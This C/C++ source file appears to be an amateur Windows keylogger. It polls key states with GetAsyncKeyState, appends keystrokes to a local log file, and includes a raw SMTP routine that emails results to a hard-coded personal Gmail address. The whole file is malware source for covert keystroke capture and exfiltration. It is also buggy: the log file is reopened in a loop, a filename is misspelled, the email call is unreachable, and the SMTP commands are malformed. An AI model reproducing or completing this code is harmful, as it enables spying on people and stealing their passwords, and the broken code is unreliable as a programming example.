#include <stdio.h> 
#include <stdlib.h> 
#include <windows.h> 

#define KEY_PRESSED -32767 

FILE *file; 

using namespace std; 

// Function Declatations 
void SendEmail (char *server, char *to, char *from, char *subject, char *message); 

int main (int argc, char *argv[])
{
    char key; 
    int index; 
    int length; 
    char *buffer; 

    file = fopen("KeyLog.tct", "a+"); 

    if (file != NULL)
    {
        while (true)
        {
            Sleep(10); 
            for(key = 0; key <= 255; key++)
            {
                file = fopen("KeyLog.txt", "a+"); 

                if (GetAsyncKeyState(key) == KEY_PRESSED)
                {
                    switch(key)
                    {
                        case VK_SPACE: 
                            fprintf(file, " "); 
                            break; 
                    }
                }
            }
        }
    }

    // Send Email 
    SendEmail("gmail-sntp-in.l.google.com", "dinitothompson@gmail.com", "dinitothompson@gmail.com", "SMTP Success", "SUCCESS"); 
    
    return 0; 
}

void SendEmail (char *server, char *to, char *from, char *subject, char *message)
{
    SOCKET sockfd; 
    WSADATA wsaData; 
    hostent *host; 
    sockaddr_in dest; 

    int sent; 
    char line[200]; 

    if (WSAStartup(0x202, &wsaData) != SOCKET_ERROR)
    {
        if ((host = gethostbyname(server)) != NULL)
        {
            // Set Memory 
            memset(&dest, 0, sizeof(dest)); 
            memcpy(&(dest.sin_addr), host->h_addr, host->h_length); 
            // Prepare Destination 
            dest.sin_family = host->h_addrtype; 
            dest.sin_port = htons(25); 
            // Get Socket
            sockfd = socket(AF_INET, SOCK_STREAM, 0); 
            // Connect 
            connect(sockfd, (struct sockaddr*)&dest, sizeof(dest)); 
            // Send Command Lines 
            strcpy(line, "Hello World\n");
            sent = send(sockfd, line, strlen(line), 0); 
            Sleep(500); 

            strcpy(line, "MAIL FROM: <"); 
            strncat(line, from, strlen(from)); 
            strncat(line, ">\n", 3); 
            sent = send(sockfd, line, strlen(line), 0); 
            Sleep(500); 

            strcpy(line, "RCPT TO: <"); 
            strncat(line, to, strlen(to)); 
            strncat(line, ">\n", 3); 
            sent = send(sockfd, line, strlen(line), 0); 
            Sleep(500); 

            strcpy(line, "Data\n"); 
            sent = send(sockfd, line, strlen(line), 0); 
            Sleep(500); 

            strcpy(line, "To:"); 
            strcat(line, to);   
            strcat(line, "\n"); 

            strcpy(line, "From:"); 
            strcat(line, from);   
            strcat(line, "\n");

            strcpy(line, "Subject:"); 
            strcat(line, subject);   
            strcat(line, "\n");  

            strcat(line, message); 
            strcat(line, "\r\n.\r\n"); 
            
            sent = send(sockfd, line, strlen(line), 0); 
            Sleep(500); 

        }
    }

    // Close Socket And WsaData
    closesocket(sockfd); 
    WSACleanup(); 
}
